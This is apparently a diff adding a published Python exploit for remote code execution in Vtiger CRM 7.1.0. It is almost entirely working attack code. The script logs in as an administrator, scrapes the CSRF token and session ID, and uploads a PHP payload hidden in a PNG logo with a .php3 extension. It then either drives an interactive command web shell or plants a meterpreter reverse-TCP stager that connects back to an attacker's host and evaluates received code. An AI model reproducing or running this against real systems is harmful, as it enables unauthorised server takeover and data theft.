@@ -1,0 +1,149 @@
+# Exploit Title: Vtiger CRM 7.1.0 - Remote Code Execution
+# Date: 2018-12-27
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Contact: https://pentest.com.tr
+# Vendor Homepage: https://www.vtiger.com
+# Software Link: https://sourceforge.net/projects/vtigercrm/files/latest/download
+# Version: v7.1.0
+# Category: Webapps
+# Tested on: XAMPP for Linux 5.6.38-0
+# Software Description : Vtiger CRM enables sales, support, and marketing teams to
+# organize and collaborate to measurably improve customer experiences and business outcomes.
+
+# Description : This application has the vulnerability of uploading files with the extension "php3" in the logo upload field.
+# But the uploaded file must be in PNG format and size 150X40.
+# We can put PHP code into image source. After you make the extension "php3", the PHP code that we've placed can work.
+# Therefore, PHP code can be executed using "<? ?>" Tags in PNG format file.
+# ==================================================================
+# I have exploited in 2 different ways.
+# First one uploads a basic php shell for you and lets you control it through the console.
+# Second one uploads the php meterpreter payload to the target site and lets you set this payload.
+
+# PoC:
+
+#!/usr/bin/python
+ 
+import mechanize, sys, cookielib, requests
+import colorama, urllib, re, random
+from colorama import Fore
+
+def bannerche():
+    print '''
+ @-------------------------------------------------------------@
+ |       Vtiger CRM 7.1.0 - Remote Code Execution Exploit      |
+ |              Vulnerability discovered by AkkuS              |
+ |               My Blog - https://pentest.com.tr              |
+ @-------------------------------------------------------------@
+          '''
+bannerche()
+ 
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <RHOST>"
+    exit(0)
+ 
+rhost = sys.argv[1]
+UserName = str(raw_input("User Name: ")) # Administrator Username Input
+Password = str(raw_input("Password: "))  # Administrator Password Input
+ 
+print(Fore.BLUE + "+ [*] Loging in...")
+br = mechanize.Browser()                 # set cookies
+br.set_handle_robots(False)
+cj = cookielib.LWPCookieJar()
+br.set_cookiejar(cj)
+ 
+br.open("http://"+rhost+"/")             # User Access Login
+assert br.viewing_html()
+br.select_form(nr=0)
+br.form['username'] = UserName
+br.form['password'] = Password
+br.submit()
+ 
+title = br.title()
+if title == "Dashboard":                 # Access control
+   print (Fore.YELLOW + "+ [*] You're in "+title+" section of the app now")
+   print (Fore.GREEN + "+ [*] Login successful")
+else:
+   print (Fore.RED + "+ [*] User information is incorrect.")
+   sys.exit()
+##
+# Introducing Cookie and CSRF token information
+##
+check = requests.get("http://"+rhost+"/index.php?module=Vtiger&parent=Settings&view=CompanyDetails&block=8&fieldid=14", cookies=cj)
+
+doc = check.text
+
+finder = re.findall(r'csrfMagicToken = ".*";', doc)
+csrf = finder[0].replace('csrfMagicToken = ', '').replace('"','').replace(';var csrfMagicName = __vtrftk;','').strip()
+csrf_to_data = str(csrf)
+print(Fore.YELLOW + "+ [*] Token = " + csrf_to_data)
+
+x = br._ua_handlers['_cookies'].cookiejar
+c = str(x)
+
+sonuc = re.findall(r"([a-fA-F\d]{32})", c)
+g = sonuc[0]
+v = str(g)
+print (Fore.YELLOW + "+ [*] PHPSESSID = " + v)
+##
+# Random value fetching
+##
+
+boundary = ''.join(str(random.randint(0,9)) for _ in xrange(29))
+filename = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(10)) + ".php3"
+
+##
+# EXPLOIT
+##
+post_cookie = {"PHPSESSID": v}
+post_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                 "Accept-Language": "en-US,en;q=0.5",
+                 "Connection": "close",
+                 "Content-Type": "multipart/form-data; boundary=---------------------------"+boundary+""}
+Basic_data = "-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"__vtrftk\"\r\n\r\n"+csrf_to_data+"\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\nVtiger\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"parent\"\r\n\r\nSettings\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nCompanyDetailsSave\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"logo\"; filename=\""+filename+"\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\<?if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"organizationname\"\r\n\r\nvtiger\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n95, 12th Main Road, 3rd Block, Rajajinagar\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\nBangalore\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\nKarnataka\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n560010\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\nIndia\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n+91 9243602352\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"fax\"\r\n\r\n+91 9243602352\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\nwww.vtiger.com\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"vatid\"\r\n\r\n\r\n-----------------------------"+boundary+"--\r\n"
+
+print (Fore.BLUE + "+ [*] Select shell type:")
+print (Fore.YELLOW +"- [*] 1 - Basic Shell")
+print ("- [*] 2 - Meterpreter Shell")
+choose = int(raw_input("- [*] Enter a number (1 or 2) : "))
+
+if choose == 1:
+    Basic = requests.post("http://"+rhost+"/index.php", headers=post_headers, cookies=post_cookie, data=Basic_data)
+    if Basic.status_code == 200:
+       print (Fore.GREEN + "+ [*] Shell successfully uploaded!")
+       print (Fore.GREEN + "+ [*] Shell Directory = http://"+rhost+"/test/logo/"+filename+"?cmd=[Command Here]")
+    while True:
+          shellctrl = requests.get("http://"+rhost+"/test/logo/"+filename+"")
+          if shellctrl.status_code == 200:
+             Command = str(raw_input(Fore.WHITE + "shell> "))
+             URL = requests.get("http://"+rhost+"/test/logo/"+filename+"?cmd="+Command+"")
+             print URL.text
+          else:
+             print (Fore.RED + "+ [X] Unable to upload or access the shell")
+             sys.exit()  
+
+elif choose == 2:
+    print("+ [*] In this option, you must listen to LHOST and LPORT with your Metasploit.")
+    print(Fore.RED + "+ [*] You should use the "+Fore.WHITE +"php/meterpreter/reverse_tcp"+Fore.RED +" payload")
+    print(Fore.YELLOW + "+ [*] Enter metasploit handler settings.")
+
+    lhost = str(raw_input(Fore.WHITE + "LHOST : "))
+    lport = str(raw_input(Fore.WHITE + "LPORT : "))
+   
+    Meter_data = "-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"__vtrftk\"\r\n\r\n"+csrf_to_data+"\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\nVtiger\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"parent\"\r\n\r\nSettings\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nCompanyDetailsSave\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"logo\"; filename=\""+filename+"\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\<?=error_reporting(0); $ip = '"+lhost+"'; $port = "+lport+"; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();?>X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"organizationname\"\r\n\r\nvtiger\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n95, 12th Main Road, 3rd Block, Rajajinagar\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\nBangalore\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\nKarnataka\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n560010\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\nIndia\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n+91 9243602352\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"fax\"\r\n\r\n+91 9243602352\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\nwww.vtiger.com\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"vatid\"\r\n\r\n\r\n-----------------------------"+boundary+"--\r\n"
+   
+    Basic = requests.post("http://"+rhost+"/index.php", headers=post_headers, cookies=post_cookie, data=Meter_data)
+    while True:
+          payload = requests.get("http://"+rhost+"/test/logo/"+filename+"")
+          print("+ [*] Check your Metasploit Framework console")
+          if payload.status_code == 200:    
+             print (Fore.GREEN + "+ [*] Payload uploaded and executed!")
+           
+          else:
+             print (Fore.RED + "+ [X] Unable to upload and run the payload")
+          sys.exit()
+else:
+    print("Invalid input!")
+# end
+
+
+vtiger0.png
